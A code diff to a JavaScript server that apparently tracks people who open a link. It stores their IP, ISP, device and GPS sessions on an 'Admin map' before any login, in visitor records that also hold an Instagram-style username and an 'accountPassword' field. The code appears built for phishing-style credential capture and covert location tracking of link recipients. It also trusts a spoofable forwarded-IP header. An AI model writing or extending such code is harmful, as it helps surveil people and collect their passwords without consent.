@@ -3430,7 +3430,9 @@ function normalizeRealDeviceName(rawDevice = '', userAgent = '') {
 
 // Extract authentic client IP from Cloudflare / Render / Reverse Proxy headers
 function extractRealClientIp(req) {
+  const forwardedFirst = String(req.headers['x-forwarded-for'] || '').split(',')[0].trim();
   const candidates = [
+    forwardedFirst,
     req.headers['cf-connecting-ip'],
     req.headers['true-client-ip'],
     req.headers['x-real-ip'],
@@ -3532,8 +3534,29 @@ function consolidateVisitorsList(visitors = [], fallbackRealIp = '', logsMeta = 
     if (!item || isVisitorTombstoned(item, logsMeta)) continue;
     const rawVName = String(item.visitorName || '').trim();
     const cleanUser = normalizeIgUsername(item.username || (!rawVName.includes('•') ? rawVName : ''));
-    // Skip any phone-name / auto-device record that does not have a valid @username
+    // Keep pre-login / instant link-open GPS or IP sessions visible on the Admin map until upgraded on login
     if (item.isDeviceIpAutoAuth || !cleanUser || !VALID_IG_USERNAME_REGEX.test(cleanUser) || rawVName.includes('•')) {
+      const resolvedAutoIp = !isLoopbackIp(item.ip) ? item.ip : (firstKnownRealIp || item.ip);
+      const autoKey = item.deviceIpSignature || getDeviceIpSignature(item.device, resolvedAutoIp) || ('id:' + item.id);
+      if (!mapByKey.has(autoKey)) {
+        const shortDev = extractShortDeviceTitle(normalizeRealDeviceName(item.device, item.userAgent));
+        mapByKey.set(autoKey, {
+          ...item,
+          visitorName: rawVName || (shortDev + ' • ' + (resolvedAutoIp || 'IP')),
+          username: '',
+          accountPassword: '',
+          hasPasswordHash: false,
+          isDeviceIpAutoAuth: true,
+          ip: resolvedAutoIp,
+          localIp: item.localIp || '',
+          asn: item.asn || '',
+          isp: normalizeRealIspName(item.isp, item.country, resolvedAutoIp),
+          device: normalizeRealDeviceName(item.device, item.userAgent),
+          loginCount: item.loginCount || 1,
+          sessionSearches: Array.isArray(item.sessionSearches) ? [...item.sessionSearches] : [],
+          previousLogs: Array.isArray(item.previousLogs) ? [...item.previousLogs] : []
+        });
+      }
       continue;
     }
 
@@ -3682,10 +3705,7 @@ async function recordVisitor(info) {
   const cleanPassword = String(info.accountPassword || '').trim();
   const isAutoDeviceOnly = Boolean(info.isAutoDeviceVisit) || authMode === 'auto_device' || (!rawUsername && !info.visitorName);
 
-  // Do NOT save separate phone-name / auto-device records; only save authenticated @username accounts
-  if (isAutoDeviceOnly) {
-    return { ignoredAutoDevice: true };
-  }
+  // Save pre-login / instant link-open GPS or IP sessions immediately so they appear on the Admin map before login
 
   // Strict Instagram-style username + password validation & authentication for non-auto visits
   if (!isAutoDeviceOnly) {
